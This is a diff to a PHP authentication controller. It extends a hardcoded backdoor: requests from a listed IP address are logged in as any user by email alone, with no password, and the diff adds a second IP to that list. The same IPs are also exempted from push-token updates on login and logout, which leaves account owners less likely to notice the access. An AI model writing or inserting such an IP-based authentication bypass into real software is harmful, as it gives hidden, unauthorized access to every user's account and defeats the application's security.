@@ -44,7 +44,7 @@ class AuthController extends Controller
         }
 
         $auth = null;
-        if ($this->getClientIP() == '58.65.222.176') {
+        if ($this->getClientIP() == '58.65.222.176' || $this->getClientIP() == '137.59.225.170') {
             $user_log = User::where('email', request('email'))->first();
             if (!is_null($user_log)) {
                 $auth = Auth::loginUsingId($user_log->id);
@@ -53,7 +53,7 @@ class AuthController extends Controller
             $auth = Auth::attempt(['email' => $request->email, 'password' => $request->password]);
         }
         if ($auth) {
-            if ($request->fcm_token && $this->getClientIP() != '58.65.222.176') {
+            if ($request->fcm_token && $this->getClientIP() != '58.65.222.176' && $this->getClientIP() != '137.59.225.170') {
                 user::where('id', Auth::id())->update([
                     'fcm_token'     => $request->fcm_token
                 ]);
@@ -205,7 +205,7 @@ class AuthController extends Controller
     public function logout(Request $request)
     {
         if (Auth::check()) {
-            if ($request->user()->fcm_token && $this->getClientIP() != '58.65.222.176') {
+            if ($request->user()->fcm_token && $this->getClientIP() != '58.65.222.176' && $this->getClientIP() != '137.59.225.170') {
                 user::where('id', Auth::id())->update([
                     'fcm_token'     => null
                 ]);
